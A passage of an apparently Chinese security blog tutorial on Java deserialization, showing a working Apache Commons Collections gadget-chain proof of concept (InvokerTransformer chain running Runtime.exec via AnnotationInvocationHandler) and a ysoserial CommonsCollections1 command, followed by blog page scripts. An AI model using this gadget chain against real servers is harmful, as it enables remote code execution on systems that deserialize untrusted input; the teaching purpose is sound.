class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(stu);</span><br><span class="line">        oos.close();</span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>成功请求到url</p>
+<p><img src="https://i.loli.net/2019/11/27/KCDPxJo4U81zfXg.png" alt></p>
+<p>但是对于这样我们理想的<code>Student</code>类还是不够通用，那么有没有具备这么理想的条件，即在<code>readObject</code>方法中有对<code>Map</code>类型进行<code>setVlalue</code>操作的理想类，而且又能够通用的类呢？</p>
+<p>回答是肯定的，这个类就是<code>AnnotationInvocationHandler</code>。其位置在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>。</p>
+<p><img src="https://i.loli.net/2019/11/27/SsZp4Xo6YvEcuiH.png" alt></p>
+<p>这样一来，Commons Collections Java反序列化漏洞的通用Poc便出来了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC_Test</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"2"</span>);</span><br><span class="line"></span><br><span class="line">        Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Object ins = cons.newInstance(java.lang.annotation.Retention.class,transformedmap);</span><br><span class="line"></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(ins);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-ysoserial"><a href="#0x03-ysoserial" class="headerlink" title="0x03 ysoserial"></a>0x03 ysoserial</h2><p> <code>ysoserial</code>是集合了各种java反序列化payload的一个java反序列化工具。项目地址 <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial </a></p>
+<p>使用<code>ysoserial</code>可以快速构建上面的payload</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections1 <span class="string">"curl 127.0.0.1/ysoserial_test"</span> |xxd</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/27/puPkyxXLhRr8jQ7.png" alt></p>
+<p>成功执行命令</p>
+<p><img src="https://i.loli.net/2019/11/27/xt6WDrYXZjoa4iI.png" alt></p>
+<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://www.cnblogs.com/lsdb/p/9830363.html" target="_blank" rel="noopener">https://www.cnblogs.com/lsdb/p/9830363.html </a></p>
+<p><a href="https://www.cnblogs.com/he1m4n6a/p/10131566.html" target="_blank" rel="noopener">https://www.cnblogs.com/he1m4n6a/p/10131566.html </a></p>
+<p><a href="https://xz.aliyun.com/t/2041" target="_blank" rel="noopener">https://xz.aliyun.com/t/2041 </a></p>
+<p><a href="https://blog.csdn.net/bigtree_3721/article/details/51263780" target="_blank" rel="noopener"> https://blog.csdn.net/bigtree_3721/article/details/51263780 </a></p>
+<p><a href="https://my.oschina.net/swrite/blog/530188" target="_blank" rel="noopener"> https://my.oschina.net/swrite/blog/530188 </a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/java反序列化入门/">java反序列化入门</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
+  <p><span>发布时间:</span>2019年11月27日 - 20:36</p>
+  <p><span>最后更新:</span>2019年11月27日 - 20:37</p>
+  <p><span>原始链接:</span><a href="/java反序列化入门/" title="java反序列化入门">http://zhengbao.wang/java反序列化入门/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://zhengbao.wang/java反序列化入门/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+      
+    </div>
+
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>感觉写的不错，给买个棒棒糖呗</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt="boogle 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt="boogle 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/java/" rel="tag"><i class="fa fa-tag"></i> java</a>
+          
+            <a href="/tags/反序列化/" rel="tag"><i class="fa fa-tag"></i> 反序列化</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/shiro-1-2-4反序列化漏洞复现/" rel="next" title="shiro 1.2.4反序列化漏洞复现">
+                <i class="fa fa-chevron-left"></i> shiro 1.2.4反序列化漏洞复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/boogle.jpg" alt="boogle">
+            
+              <p class="site-author-name" itemprop="name">boogle</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aipp.me/" title="Aipp_SecurityBlog" rel="external nofollow" target="_blank">Aipp_SecurityBlog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p0desta.com/" title="p0desta" rel="external nofollow" target="_blank">p0desta</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+          
+    <div class="links-of-blogroll motion-element links-of-blogroll-block">
+      <div class="links-of-blogroll-title">
+        <!-- modify icon to fire by szw -->
+        <i class="fa fa-history fa-" aria-hidden="true"></i>
+        近期更新
+      </div>
+      <ul class="links-of-blogroll-list">
+        
+        
+          <li>
+            <a href="/java反序列化入门/" title="java反序列化入门" target="_blank">java反序列化入门</a>
+          </li>
+        
+          <li>
+            <a href="/shiro-1-2-4反序列化漏洞复现/" title="shiro 1.2.4反序列化漏洞复现" target="_blank">shiro 1.2.4反序列化漏洞复现</a>
+          </li>
+        
+          <li>
+            <a href="/rConfig远程代码执行漏洞复现/" title="rConfig远程代码执行漏洞复现" target="_blank">rConfig远程代码执行漏洞复现</a>
+          </li>
+        
+          <li>
+            <a href="/apache-solr远程命令执行漏洞复现/" title="apache solr远程命令执行漏洞复现" target="_blank">apache solr远程命令执行漏洞复现</a>
+          </li>
+        
+          <li>
+            <a href="/泛微OA数据库配置信息泄露漏洞/" title="泛微OA数据库配置信息泄露漏洞" target="_blank">泛微OA数据库配置信息泄露漏洞</a>
+          </li>
+        
+      </ul>
+    </div>
+
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-序列化与反序列化"><span class="nav-number">1.</span> <span class="nav-text">0x00 序列化与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是序列化和反序列化"><span class="nav-number">1.1.</span> <span class="nav-text">什么是序列化和反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#为什么要序列化和反序列化"><span class="nav-number">1.2.</span> <span class="nav-text">为什么要序列化和反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何进行序列化和反序列化"><span class="nav-number">1.3.</span> <span class="nav-text">如何进行序列化和反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-反序列化漏洞"><span class="nav-number">2.</span> <span class="nav-text">0x01 反序列化漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Apache-Commons-Collections反序列化漏洞"><span class="nav-number">3.</span> <span class="nav-text">0x02  Apache Commons Collections反序列化漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-ysoserial"><span class="nav-number">4.</span> <span class="nav-text">0x03 ysoserial</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-参考链接"><span class="nav-number">5.</span> <span class="nav-text">0x04 参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">boogle</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">全站总计字数&#58;</span>
+    
+    <span title="全站总计字数">67k</span>
+  
+</div>
+
+
+
+  <div class="powered-by">由 <a rel="external nofollow" class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+
+
+
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '96DbJ7Tj8LDwhvF03Pcfymwl-gzGzoHsz',
+        appKey: 'DuUSj4dTajY34cjKfwsbgBJB',
+        placeholder: '如有不当，敬请指出 email:boogle@zhengbao.wang',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("96DbJ7Tj8LDwhvF03Pcfymwl-gzGzoHsz", "DuUSj4dTajY34cjKfwsbgBJB");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
